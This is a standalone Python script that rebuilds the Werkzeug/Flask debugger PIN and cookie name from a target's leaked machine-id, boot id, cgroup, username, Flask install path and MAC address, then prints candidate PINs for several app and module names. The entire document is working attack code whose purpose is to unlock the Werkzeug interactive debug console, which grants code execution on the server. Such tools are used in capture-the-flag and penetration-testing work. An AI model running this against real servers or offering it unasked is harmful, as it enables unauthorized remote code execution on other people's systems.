#!/usr/bin/env python3

import dotenv, hashlib, itertools

def generate_machine_id(machine_id, boot_id, cgroup):
    linux = b""
    if machine_id:
      linux += bytes(machine_id, encoding='utf-8')
    else :
      linux += bytes(boot_id, encoding='utf-8')
    linux += bytes(cgroup.split("/")[-1], encoding='utf-8')
    if linux is not None:
        return linux

def get_uuid(mac_address):
    uuid = str(int(mac_address.replace(":", ""),16))
    return uuid

def generate_pin(public_bits, private_bits):
    rv = None
    pin = None
    num = None
    hash = hashlib.sha1()
    for bit in itertools.chain(public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        hash.update(bit)
    hash.update(b"cookiesalt")
    cookie_name = f"__wzd{hash.hexdigest()[:20]}"
    if num is None:
        hash.update(b"pinsalt")
        num = f"{int(hash.hexdigest(), 16):09d}"[:9]
    if rv is None:
        for group_size in 5,4,3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num
    print(f"Public Bits : f{public_bits}")
    print(f"Pin code : {rv} | cookie name : {cookie_name}")


if __name__ == "__main__":
    env = dotenv.dotenv_values()
    machine_id = env.get("MACHINEID")
    boot_id = env.get("BOOTID")
    cgroup = env.get("CGROUP")
    username = env.get("USERNAME")
    flask_path = env.get("FLASKPATH")
    mac_address = env.get("DEVICEMACADDRESS")
    if env is None or \
      boot_id == "" or \
      cgroup == "" or \
      username == "" or \
      flask_path == "" or \
      mac_address == "":
        print("You must fill all the entries int he .env file.")
        exit(1)
    private_bits = [get_uuid(mac_address),generate_machine_id(machine_id, boot_id, cgroup)]
    print(private_bits)
    modnames = ["flask.app", "werkzeug.debug"]
    apps = ["Flask", "wsgi_app", "DebuggedApplication"]
    for modname in modnames:
        for app in apps:
          public_bits = [username, modname, app, flask_path]
          generate_pin(public_bits, private_bits)
